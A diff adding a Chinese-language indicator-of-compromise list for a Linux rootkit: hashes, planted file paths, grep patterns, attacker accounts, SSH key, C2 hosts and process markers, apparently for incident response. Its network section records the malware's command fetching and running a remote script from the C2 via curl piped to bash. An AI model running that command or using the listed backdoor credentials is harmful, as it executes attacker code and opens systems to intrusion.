@@ -1,0 +1,153 @@
+# IOC 清单 —— Linux rootkit (child.malware 家族, 采集自 154.219.110.37)
+# 生成时间：2026-11-14
+# 用法：拷贝到排查主机，按注释逐组 grep / 比对
+
+## 1. 样本哈希
+6b9e912f408b96ac92b400e8c4f373626ff810085008a9eddba6957520bd9edf   child.malware (原样, UPX)
+b9731800230a23f60c0ae2d5b3d17e263c76509771f831b3074f421a3e71e7b2   child.malware (脱壳后 Go)
+2981d2bd2e3082d0acc96e6150594cacac55da17b638282d5e8b0ed45b81d213   libnss_cache.so (空壳伪装库)
+37716b71a43235520d1e782817eafc0ab6e72226d5a13daa501ff8b03e915683   libnss_cache.so.hider.<pid> (隐藏库)
+bdb1e0ec5c1b91a0609c1cccfa8e2502e54971098260a867a24878682d6c4593   被篡改的 rm（.orig_rm）
+79827cd008c3158399ffda92e85bbbf2c5d79cf17ffc8496ffdce05f20df08a3   被篡改的 kill（.orig_kill）
+6e068b7320fd79565d3cb6b06e0d7b3c388d9e725f30cdf4e773be97601650fe   被篡改的 passwd/chpasswd（.orig_passwd）
+110fe78e84da5cefdf7e6b8b34b74a47459d10f635b385f4fa3418e40f5b60e7   被篡改的 chattr（.orig_chattr）
+512a4dc1aa0ef04a44985e7072cc965088cabd7a041e4b53a1b5004551e19de0   内嵌 NSS 模块 libnss_ninel.so.2
+eff9c045b7cddc0aa988e86ecf5cce15b4df8da117f2b2bf2193be53cab787ab   内嵌 PAM 后门 pam_master.so
+f3effd0e5de2d3b67c8a1f76a4f184cfdf575d2a5c44d1dde2021a898aba4a3a   内嵌 LD_PRELOAD 隐藏库
+
+## 2. 文件路径（不存在即算清除）
+/var/lib/systemd/cache-service
+/usr/local/lib/.system-service
+/usr/local/lib/libnss_cache.so
+/tmp/.libnss_cache.so
+/usr/lib/libnss_ninel.so.2
+/lib/x86_64-linux-gnu/libnss_ninel.so.2
+/usr/lib/x86_64-linux-gnu/libnss_ninel.so.2
+/lib64/libnss_ninel.so.2
+/lib/aarch64-linux-gnu/libnss_ninel.so.2
+/usr/lib64/libnss_ninel.so.2
+/lib/security/pam_master.so
+/lib64/security/pam_master.so
+/lib/x86_64-linux-gnu/security/pam_master.so
+/lib/aarch64-linux-gnu/security/pam_master.so
+/usr/lib64/security/pam_master.so
+/etc/.pm
+/etc/ld.so.preload
+/etc/cron.d/systemd-timers
+/etc/cron.d/systemd-boot
+/etc/cron.d/systemd-boot-early
+/etc/cron.d/.systemd-update-notifier
+/etc/systemd/system-generators/system-service-generator
+/usr/local/lib/systemd/system-generators/update-checker
+/usr/local/lib/systemd/system-generators/system-service-generator
+/etc/initramfs-tools/hooks/zz-system-service
+/usr/share/initramfs-tools/hooks/zz-system-service
+/etc/systemd/system/systemd-resolved-cache.service
+/etc/systemd/system/systemd-networkd-helper.service
+/etc/systemd/system/systemd-timesyncd-update.service
+/etc/systemd/system/dbus-system-helper.service
+/etc/systemd/system/systemd-journald-cache.service
+/etc/systemd/system/myservices.service
+/usr/lib/systemd/system/myservices.service
+/usr/local/bin/systemd-resolved-helper
+/usr/local/bin/systemd-networkd-helper
+/usr/local/bin/systemd-timesyncd-helper
+/usr/local/bin/dbus-system-helper
+/usr/local/bin/systemd-journald-helper
+/usr/bin/ssshd
+/usr/libexec/.rm
+/usr/libexec/.kill
+/usr/libexec/.chatattr
+/usr/libexec/.apt
+/usr/libexec/.apt-cli
+/var/tmp/876c7af6/01b51ec6
+/var/tmp/updates-20260202
+/var/log/.apt-cache.log
+/dev/shm/.orig_rm
+/dev/shm/.orig_kill
+/dev/shm/.orig_passwd
+/dev/shm/.orig_chattr
+/dev/shm/.ph-dbg
+/tmp/processhider_debug.log
+/etc/.dbus-system
+/opt/.dbus-system
+/opt/.cache-metadata
+/etc/.systemd-private
+/opt/.systemd-private
+/etc/.fontconfig-cache
+/etc/.fontconfig-cache/.gvfs-cache/.sysconfig
+/opt/.systemd-private/.pki/.sysconfig
+/usr/local/share/.themes-data
+/usr/local/share/.fonts-cache
+/var/cache/.themes
+/var/cache/.config
+/dev/shm/.Xgnupg-metadata
+/dev/shm/.Xgnupg-metadata/.fontconfig/.sysconfig
+/dev/shm/.config
+/dev/shm/.pulse
+/dev/shm/.X11-cache
+/dev/shm/.Xfont-cache
+/dev/shm/.Xdbus-session
+/dev/shm/.ICE-cache
+/dev/shm/.dpkg-lock
+/dev/shm/.apt-cache
+/dev/shm/.apt-log
+/dev/shm/.rpm-state.log
+/dev/shm/.yum-state.log
+/etc/sudoers.d/99-ninel-root
+/etc/sudoers.d/node
+/etc/authselect/custom/pam_master/password-auth
+/etc/authselect/custom/pam_master/system-auth
+
+## 3. 配置特征（grep 用）
+/etc/nsswitch.conf        -> 含 "ninel"（passwd/shadow/group 三行）
+/etc/passwd /etc/shadow   -> 含 "^ninel:"（备用 "^node:"）
+/etc/sudoers.d/*          -> 含 "NOPASSWD:ALL"
+/etc/ssh/sshd_config      -> 含 "Match User ninel" / "AuthorizedKeysFile /var/tmp/updates-20260202" / "StrictModes no"
+/etc/pam.d/*              -> 含 "pam_master.so"
+/etc/cron.d/* /var/spool/cron/crontabs/root -> 含 ".system-service" / "876c7af6" / "01b51ec6"
+/etc/rc.local ~/.bashrc ~/.profile -> 含 "system-service" / "cache-service" / "LD_PRELOAD="
+
+## 4. 账户 / 密钥
+新增账户：ninel（uid 常见 9999，home /dev/null，shell /bin/bash）、node
+SSH 公钥指纹（攻击者）：SHA256:AkrAM6Cdbkqok1OHU527WzpYGQqPQJrubcEP9Dlj7yI
+SSH 公钥注释：ElPatrono1337
+完整公钥：ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoBjnno5GBoIuIYIhrJsQxF6OPHtAbOUIEFB+gdfb1tUTjs+f9zCMGkmNmH45fYVukw6IwmhTZ+AcD3eDpgsTloqmVgcXDUmvjWR/fNiImmgU9wlw/lalf/WrIuCDp0PArQtjNg/vo7HUGq9SrEIE2jvyVW59mvoYOwfnDLUiguKZirZgpjZF2DDKK6WpZVTVpKcH+HEFdmFAqJInem/CRUE0bqjMr88bUyDjVw9FtJ5EmQenctjrFVaB7hswOaJBmFQmn9G/BXkMvZ6mX7LzCUM2PVHnVfVeCLdwiOINikzW9qzlr8WoHw4qEGJLuQBWXjJu+m2+FdaOD6PL53nY3w== ElPatrono1337
+PAM 备用哈希（/etc/.pm 为 REPLACE 时生效）：
+$6$cONA0kbmpUGiT1Vt$j7LdoaXFCMA5lr32B/LMOnvY3z7id6CUEfSl9hIl9lH0kSYNIq.NLLLnGJ7lPCuqnQqHwDnzWO19SNzwD8Fgs/
+
+## 5. 网络
+195.24.237.240               (C2, 路径 /.x/black3)
+digital.digitaldatainsights.org  (备用 C2, 路径 /.x/black3)
+行为：curl -s --connect-timeout 15 <C2>/.x/black3 | bash
+
+## 6. 环境变量标记（进程 environ 里出现即命中）
+__CHILD_MARKER
+__WATCHDOG_MARKER
+__WATCHDOG_MONITOR
+__WATCHDOG_MASKED
+__DECOY__
+__MASKED__
+__BACKUP_CHECK
+LANG_OVERRIDE____
+LOCAL_FLAG
+INITIALIZED_STATE_
+__CHILD_PROCESS_NAME
+__CMDLINE_MASKED
+__SELECTED_NAME
+__TRACE_LOGS__
+MARINICA_BISCUITE
+
+## 7. 进程/命令行关键字
+cache-service
+.system-service
+01b51ec6
+876c7af6
+processhider
+libnss_cache
+libnss_ninel
+pam_master
+ssshd
+systemd-resolved-helper / systemd-networkd-helper / systemd-timesyncd-helper
+dbus-system-helper / systemd-journald-helper
+update-checker
